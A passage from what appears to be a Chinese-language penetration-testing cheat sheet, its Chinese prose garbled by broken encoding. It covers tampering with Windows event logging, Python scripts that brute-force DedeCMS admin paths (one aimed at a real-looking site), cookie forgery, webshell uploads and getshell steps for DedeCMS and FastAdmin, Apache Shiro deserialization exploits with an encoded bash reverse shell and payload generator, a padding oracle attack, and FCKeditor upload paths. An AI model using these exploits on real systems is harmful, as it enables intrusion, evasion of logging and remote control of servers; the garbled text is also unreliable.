<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>ä»¥ä¸‹æ¼”ç¤º
net user ola olaæ‰§è¡Œå¹¶æ›´æ”¹ç”¨æˆ·çš„olaå¯†ç ï¼Œå¹¶åœ¨6:55:30 PMè®°å½•äº‹ä»¶4724
</code></pre>
<p><img src="./img/821.png" alt="image"><br><img src="./img/822.png" alt="image"></p>
<pre><code>æ‰§è¡Œæ–‡ä»¶ï¼Œsvchost.exeä¸­æš‚åœäº†4ä¸ªEventLogçº¿ç¨‹
</code></pre>
<p><img src="./img/823.png" alt="image"><br><img src="./img/824.png" alt="image"></p>
<pre><code>å†æ¬¡æ‰§è¡Œä¿®æ”¹å¯†ç å‘½ä»¤
</code></pre>
<p><img src="./img/825.png" alt="image"><br><img src="./img/826.png" alt="image"></p>
<pre><code>æ–°çš„äº‹ä»¶æ²¡æœ‰å†™å…¥ï¼Œåªæœ‰æŒ‚èµ·å‰çš„äº‹ä»¶
</code></pre>
<p><img src="./img/827.png" alt="image"></p>
<h2 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h2><h3 id="çˆ†ç ´åå°"><a href="#çˆ†ç ´åå°" class="headerlink" title="çˆ†ç ´åå°"></a>çˆ†ç ´åå°</h3><pre><code>windowsæœåŠ¡å™¨
tags.php
</code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> itertools
characters <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789_!#"</span>
back_dir <span class="token operator">=</span> <span class="token string">""</span>
flag <span class="token operator">=</span> <span class="token number">0</span>
url <span class="token operator">=</span> <span class="token string">"http://www.test.com/tags.php"</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"_FILES[mochazz][tmp_name]"</span> <span class="token punctuation">:</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token punctuation">,</span>
    <span class="token string">"_FILES[mochazz][name]"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token string">"_FILES[mochazz][size]"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token string">"_FILES[mochazz][type]"</span> <span class="token punctuation">:</span> <span class="token string">"image/gif"</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">for</span> pre <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>characters<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        pre <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token operator">=</span>pre<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"testing"</span><span class="token punctuation">,</span>pre<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> <span class="token number">1</span>
            back_dir <span class="token operator">=</span> pre
            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] å‰ç¼€ä¸ºï¼š"</span><span class="token punctuation">,</span>back_dir<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> characters<span class="token punctuation">:</span>
        <span class="token keyword">if</span> ch <span class="token operator">==</span> characters<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">break</span>
        data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token operator">=</span>back_dir<span class="token operator">+</span>ch<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            back_dir <span class="token operator">+=</span> ch
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] "</span><span class="token punctuation">,</span>back_dir<span class="token punctuation">)</span>
            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åå°åœ°å€ä¸ºï¼š"</span><span class="token punctuation">,</span>back_dir<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>rss.php
</code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
payloads <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789_-'</span>
menu <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token string">"dopost=save&amp;_FILES[b4dboy][tmp_name]=../%s%s&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif"</span><span class="token operator">%</span> <span class="token punctuation">(</span>menu<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://www.yx-tv.com/plus/rss.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            menu <span class="token operator">+=</span> payload
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> payload <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="dedecmså‰å°é‡ç½®ä»»æ„ç®¡ç†å‘˜å¯†ç "><a href="#dedecmså‰å°é‡ç½®ä»»æ„ç®¡ç†å‘˜å¯†ç " class="headerlink" title="dedecmså‰å°é‡ç½®ä»»æ„ç®¡ç†å‘˜å¯†ç "></a>dedecmså‰å°é‡ç½®ä»»æ„ç®¡ç†å‘˜å¯†ç </h3><pre><code>https://xz.aliyun.com/t/1959
</code></pre>
<h3 id="ä¼ªé€ cookieç™»å½•ä»»æ„å‰å°ç”¨æˆ·"><a href="#ä¼ªé€ cookieç™»å½•ä»»æ„å‰å°ç”¨æˆ·" class="headerlink" title="ä¼ªé€ cookieç™»å½•ä»»æ„å‰å°ç”¨æˆ·"></a>ä¼ªé€ cookieç™»å½•ä»»æ„å‰å°ç”¨æˆ·</h3><pre><code>æ³¨å†Œç”¨æˆ·user1
è®¿é—®
/member/index.php?uid=user1
ç™»å½•user1
å°†last_vidçš„å€¼èµ‹ç»™DedeUserIDï¼Œlast_vidckMd5çš„å€¼èµ‹ç»™DedeUserIDckMd5ä¿®æ”¹åçš„cookie
</code></pre>
<h3 id="å‰å°ä¸Šä¼ shell"><a href="#å‰å°ä¸Šä¼ shell" class="headerlink" title="å‰å°ä¸Šä¼ shell"></a>å‰å°ä¸Šä¼ shell</h3><pre><code>Adminç™»å½•ï¼Œå‘è¡¨æ–‡ç« ï¼Œä¿®æ”¹æ–‡ä»¶å1.jpg.p*hp
åå°æ–‡ä»¶ä¸Šä¼ 
è®¿é—®/dede/tpl.php?action=upload
F12è·å–token
è®¿é—®
/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[tokenå€¼]
/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=&lt;?php phpinfo();?&gt;&amp;token=6d0c1893e01a77e7e6ba24fb2dc7599c
Shellä½ç½®/include/taglib/moonsec.lib.php
</code></pre>
<h3 id="åå°getshell"><a href="#åå°getshell" class="headerlink" title="åå°getshell"></a>åå°getshell</h3><pre><code>æ¨¡å—-&gt;å¹¿å‘Šç®¡ç†-&gt;æ–°å»ºå¹¿å‘Šï¼Œåœ¨å¹¿å‘Šå†…å®¹ä¸­æ·»åŠ ä¸€å¥è¯
/plus/ad_js.php?aid=[x]
</code></pre>
<h2 id="FastAdminå‰å°getshell"><a href="#FastAdminå‰å°getshell" class="headerlink" title="FastAdminå‰å°getshell"></a>FastAdminå‰å°getshell</h2><pre><code>å‰å°åˆ›å»ºç”¨æˆ·ï¼Œä¿®æ”¹å¤´åƒï¼Œä¼ å›¾ç‰‡é©¬
/public/index/user/_empty?name=../../public/uploads/20200926/4a91d432904c0042bcd038ea96ad4947.jpg
</code></pre>
<h2 id="Shiro-rememberMeååºåˆ—åŒ–æ¼æ´"><a href="#Shiro-rememberMeååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Shiro rememberMeååºåˆ—åŒ–æ¼æ´"></a>Shiro rememberMeååºåˆ—åŒ–æ¼æ´</h2><pre><code>Shiroç›¸å…³è½¬è‡ªbypasså…¬ä¼—å·
https://github.com/insightglacier/Shiro_exploit
python shiro_exploit.py -u http://192.168.172.129:8080
</code></pre>
<p><img src="./img/828.png" alt="image"></p>
<pre><code>é€šè¿‡è·å–åˆ°çš„keyï¼Œå¸¸è§çš„æ¼æ´åˆ©ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼šåå¼¹shellå’Œå†™å…¥æ–‡ä»¶ã€‚
åå¼¹shell
ç›‘å¬æœ¬åœ°ç«¯å£
nc -lvp 1234
Java Runtime é…åˆ bash ç¼–ç ï¼Œåœ¨çº¿ç¼–ç åœ°å€ï¼š
http://www.jackson-t.ca/runtime-exec-payloads.html
å°†bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1ç¼–ç 
bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;
é€šè¿‡ysoserialä¸­JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬6666ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;
ä½¿ç”¨shiro.py ç”ŸæˆPayload
python shiro.py 192.168.172.133:6666
</code></pre>
<p><img src="./img/829.png" alt="image"></p>
<pre><code>shiro.pyä»£ç å¦‚ä¸‹
</code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> uuid
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> subprocess
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">def</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span><span class="token punctuation">,</span> <span class="token string">'JRMPClient'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>    
BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size    
pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    
key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span>    
iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>    
encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    
file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
base64_ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>    
<span class="token keyword">return</span> base64_ciphertext
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   payload <span class="token operator">=</span> encode_rememberme<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token keyword">print</span> <span class="token string">"rememberMe=&#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>æ„é€ æ•°æ®åŒ…ï¼Œä¼ªé€ cookieï¼Œå‘é€Payloadã€‚
</code></pre>
<p><img src="./img/830.png" alt="image"><br><img src="./img/831.png" alt="image"></p>
<pre><code>å†™å…¥æ–‡ä»¶
ç”Ÿæˆpoc.seræ–‡ä»¶
sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser
ä½¿ç”¨Shiroå†…ç½®çš„é»˜è®¤å¯†é’¥å¯¹Payloadè¿›è¡ŒåŠ å¯†ï¼š
</code></pre>
<p><img src="./img/832.png" alt="image"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">shiro</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">AesCipherService</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">CodecSupport</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ByteSource</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">DefaultSerializer</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">FileSystems</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRemember</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payloads <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">FileSystems</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token string">"d://poc.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token class-name">AesCipherService</span> aes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token class-name">CodecSupport</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ByteSource</span> ciphertext <span class="token operator">=</span> aes<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>payloads<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="./img/833.png" alt="image"><br><img src="./img/834.png" alt="image"></p>
<h2 id="Shiro-Padding-Oracle-Attack"><a href="#Shiro-Padding-Oracle-Attack" class="headerlink" title="Shiro Padding Oracle Attack"></a>Shiro Padding Oracle Attack</h2><pre><code>ç™»å½•Shiroç½‘ç«™ï¼Œä»cookieä¸­è·å¾—rememberMeå­—æ®µçš„å€¼
</code></pre>
<p><img src="./img/835.png" alt="image"></p>
<pre><code>åˆ©ç”¨DNSlogæ¢æµ‹ï¼Œé€šè¿‡ysoserialå·¥å…·payloadã€‚
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class
ä½¿ç”¨rememberMeå€¼ä½œä¸ºprefixï¼ŒåŠ è½½Payloadï¼Œè¿›è¡ŒPadding Oracleæ”»å‡»ã€‚
java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath
https://github.com/longofo/PaddingOracleAttack-Shiro-721
</code></pre>
<p><img src="./img/836.png" alt="image"><br><img src="./img/837.png" alt="image"></p>
<pre><code>ä½¿ç”¨æ„é€ çš„rememberMeæ”»å‡»å­—ç¬¦ä¸²é‡æ–°è¯·æ±‚ç½‘ç«™
</code></pre>
<p><img src="./img/838.png" alt="image"><br><img src="./img/839.png" alt="image"></p>
<pre><code>ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·
https://github.com/feihong-cs/ShiroExploit
</code></pre>
<h2 id="shiroæƒé™ç»•è¿‡"><a href="#shiroæƒé™ç»•è¿‡" class="headerlink" title="shiroæƒé™ç»•è¿‡"></a>shiroæƒé™ç»•è¿‡</h2><pre><code>/;/test/admin/page
</code></pre>
<h2 id="ç¼–è¾‘å™¨æ¼æ´"><a href="#ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´"></a>ç¼–è¾‘å™¨æ¼æ´</h2><h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><pre><code>ç‰ˆæœ¬
FCKeditor/_whatsnew.html
ç¼–è¾‘å™¨
FCKeditor/_samples/default.html
FCKeditor/_samples/default.html
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp
fckeditor/editor/filemanager/connectors/test.html
ä¸Šä¼ 
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html
ä¸Šä¼ è·¯å¾„
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditorè¢«åŠ¨é™åˆ¶ç­–ç•¥æ‰€å¯¼è‡´çš„è¿‡æ»¤ä¸ä¸¥é—®é¢˜
å½±å“ç‰ˆæœ¬: FCKeditor x.x &lt;= FCKeditor v2.4.3
è„†å¼±æè¿°ï¼šFCKeditor v2.4.3ä¸­Fileç±»åˆ«é»˜è®¤æ‹’ç»ä¸Šä¼ ç±»å‹ï¼šhtml|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtmFckeditor 2.0 &lt;= 2.2å…è®¸ä¸Šä¼ asaã€cerã€php2ã€php4ã€incã€pwmlã€phtåç¼€çš„æ–‡ä»¶
ä¸Šä¼ å å®ƒä¿å­˜çš„æ–‡ä»¶ç›´æ¥ç”¨çš„$sFilePath = $sServerDir . $sFileNameï¼Œè€Œæ²¡æœ‰ä½¿ç”¨$sExtensionä¸ºåç¼€ã€‚ç›´æ¥å¯¼è‡´åœ¨winä¸‹åœ¨ä¸Šä¼ æ–‡ä»¶åé¢åŠ ä¸ª.æ¥çªç ´[æœªæµ‹è¯•]ã€‚è€Œåœ¨apacheä¸‹ï¼Œå› ä¸ºâ€Apacheæ–‡ä»¶åè§£æç¼ºé™·æ¼æ´â€ä¹Ÿå¯ä»¥åˆ©ç”¨ä¹‹ï¼Œè¯¦è§â€é™„å½•Aâ€å¦å»ºè®®å…¶ä»–ä¸Šä¼ æ¼æ´ä¸­å®šä¹‰TYPEå˜é‡æ—¶ä½¿ç”¨Fileç±»åˆ«æ¥ä¸Šä¼ æ–‡ä»¶,æ ¹æ®FCKeditorçš„ä»£ç ï¼Œå…¶é™åˆ¶æœ€ä¸ºç‹­éš˜ã€‚æ”»å‡»åˆ©ç”¨:
å…è®¸å…¶ä»–ä»»ä½•åç¼€ä¸Šä¼ 
åˆ©ç”¨2003è·¯å¾„è§£ææ¼æ´ä¸Šä¼ æœ¨é©¬
å½±å“ç‰ˆæœ¬: ç´¢å¼•åº•éƒ¨é™„å½•B
è„†å¼±æè¿°ï¼š
